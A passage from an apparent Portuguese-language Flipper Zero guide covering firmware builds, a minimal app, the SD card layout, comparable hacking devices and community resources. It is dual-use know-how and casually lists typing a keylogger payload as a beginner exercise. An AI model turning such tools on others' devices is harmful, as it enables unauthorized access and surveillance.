*A FCC não proíbe possuir ou usar um dispositivo que receba sinais Sub-GHz. A transmissão sem licença em certas frequências é proibida. A maioria dos dispositivos Sub-GHz de consumo opera em faixas ISM sem licença (315 MHz, 433 MHz e 915 MHz), e os níveis de potência envolvidos costumam respeitar os limites da Part 15.*

O Canadá tentou bloquear as importações do Flipper Zero em 2024 por preocupações com roubos de carros. A medida respondeu sobretudo à cobertura da mídia sobre ataques de retransmissão de chaves automotivas, sem precisão técnica: a entrada sem chave dos carros modernos usa códigos rolantes, que o Flipper não consegue vencer sem hardware adicional.

{{< figure src="flipper-zero-legal-framework-authorized-vs-illegal-use-cases-us-eu-cfaa-guidelines.webp" alt="Gráfico que compara usos autorizados e ilegais do Flipper Zero conforme a CFAA dos EUA e as leis europeias contra crimes informáticos, com cenários de exemplo" >}}

## Configuração de um ambiente de desenvolvimento

### Compilação do firmware oficial

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# Instalar a cadeia de ferramentas (Linux/macOS)
./fbt

# Compilar o firmware
./fbt fap_dist

# Gravar via USB
./fbt flash_usb_full
```

O **FBT (Flipper Build Tool)** instala a cadeia de ferramentas, busca dependências e coordena a compilação automaticamente. Você precisa do Python 3.8+ e do compilador cruzado ARM GCC.

### Criação de um aplicativo personalizado

Os aplicativos usam o formato **Flipper Application Package (FAP)**. Cada app fica em um diretório dentro de `applications_user/` ou `applications/`.

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// Estrutura mínima de um FAP; a fonte padrão só aceita ASCII, então a saudação fica em inglês.
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

Os aplicativos interagem com o hardware do Flipper pela API **Furi** (Flipper Universal Registry Implementation). O acesso aos subsistemas é baseado em registros: abra um registro pelo nome, obtenha um ponteiro para o subsistema, use-o e feche o registro.

### Estrutura de pastas do cartão SD

O Flipper espera pastas específicas no cartão SD:

| Diretório | Conteúdo |
|-----------|---------|
| `subghz/` | Capturas Sub-GHz salvas (arquivos .sub) |
| `nfc/` | Despejos NFC salvos (arquivos .nfc) |
| `lfrfid/` | Chaves RFID LF salvas (arquivos .rfid) |
| `infrared/` | Controles remotos IR salvos (arquivos .ir) |
| `ibutton/` | Chaves iButton salvas (arquivos .ibtn) |
| `badusb/` | Cargas DuckyScript (arquivos .txt) |
| `apps/` | Aplicativos FAP de terceiros |
| `music_player/` | Arquivos de música .fmf |
| `dolphin/` | Dados salvos de experiência do Dolphin |

## Comparação do Flipper Zero com alternativas

| Dispositivo | Preço | Sub-GHz | NFC/RFID | IR | GPIO | Observações |
|--------|-------|---------|----------|----|------|-------|
| **Flipper Zero** | ~$170 | Sim (CC1101) | Sim (completo) | Sim | Sim | Melhor opção geral |
| **HackRF One** (rádio definido por software) | ~$350 | Sim (SDR) | Não | Não | Limitado | SDR completo, faixa muito mais ampla, sem NFC integrado |
| **RTL-SDR** | ~$25 | Somente recepção | Não | Não | Não | SDR mais barato para análise somente de recepção |
| **Proxmark3** | ~$300 | Não | Sim (avançado) | Não | Limitado | Análise RFID/NFC superior, menos recursos nas demais áreas |
| **USB Rubber Ducky** | ~$60 | Não | Não | Não | Não | Somente BadUSB, sem conexão sem fio |
| **ChameleonMini** | ~$80 | Não | Sim | Não | Limitado | Emulador dedicado a NFC/RFID |
| **WiFi Pineapple** | ~$100 | Somente Wi-Fi | Não | Não | Não | Plataforma dedicada a ataques 802.11 |

O ponto forte do Flipper Zero é a amplitude. Ele não é o melhor em profundidade em nenhuma categoria isolada. Para trabalho avançado com RFID/NFC, o Proxmark3 é superior. Para SDR completo, HackRF ou USRP oferecem muito mais recursos. Para ataques 802.11, o WiFi Pineapple é uma plataforma melhor. O Flipper Zero é a ferramenta para levar quando você não sabe o que vai encontrar.

## Recursos comunitários

| Recurso | URL | Descrição |
|----------|-----|-----------|
| **Documentação oficial** | docs.flipper.net | API do firmware e especificações de hardware |
| **GitHub oficial** | github.com/flipperdevices | Código-fonte do firmware e rastreador de problemas |
| **GitHub do Unleashed** | github.com/DarkFlippers/unleashed-firmware | Fork Unleashed |
| **GitHub do Xtreme** | github.com/Flipper-XFW/Xtreme-Firmware | Fork Xtreme |
| **flipc.org** | flipc.org | Banco comunitário de sinais |
| **Repositório UberGuidoZ** | github.com/UberGuidoZ/Flipper | Capturas Sub-GHz e bancos de dados IR |
| **awesome-flipperzero** | github.com/djsime1/awesome-flipperzero | Lista selecionada de recursos |
| **r/flipperzero** | reddit.com/r/flipperzero | Perguntas e respostas da comunidade |
| **Discord do Flipper** | discord.gg/flipperzero | Suporte comunitário em tempo real |

---

O Flipper Zero recompensa quem se aprofunda no aparelho. A experiência inicial é acessível a iniciantes: ler um cartão, capturar o sinal de um controle e digitar uma carga de keylogger. Depois que você entende os detalhes internos do firmware, o ecossistema de expansão GPIO e o catálogo comunitário de aplicativos, encontra uma ferramenta que acompanha uma carreira em segurança física, segurança embarcada ou pesquisa sem fio.

Leia seus próprios cartões, teste seus próprios sistemas e obtenha autorização por escrito antes de testar os sistemas de outras pessoas.

## Referências

- [Site oficial do Flipper Zero](https://flipperzero.one/)
- [Repositório oficial do Flipper Zero no GitHub](https://github.com/flipperdevices/flipperzero-firmware)
- [Documentação do Flipper Zero](https://docs.flipper.net/)
- [Firmware Unleashed](https://github.com/DarkFlippers/unleashed-firmware)
- [Firmware Xtreme](https://github.com/Flipper-XFW/Xtreme-Firmware)
- [Recursos UberGuidoZ para Flipper](https://github.com/UberGuidoZ/Flipper)
- [Banco comunitário flipc.org](https://flipc.org/)
- [awesome-flipperzero (recursos selecionados para Flipper Zero)](https://github.com/djsime1/awesome-flipperzero)
- [Folha de dados CC1101 — Texas Instruments](https://www.ti.com/product/CC1101)
- [Folha de dados ST25R3916B — STMicroelectronics](https://www.st.com/en/nfc/st25r3916b.html)
- [Ferramentas e técnicas essenciais de hardware hacking](https://simeononsecurity.com/articles/hardware-hacker-essential-tools-techniques/)
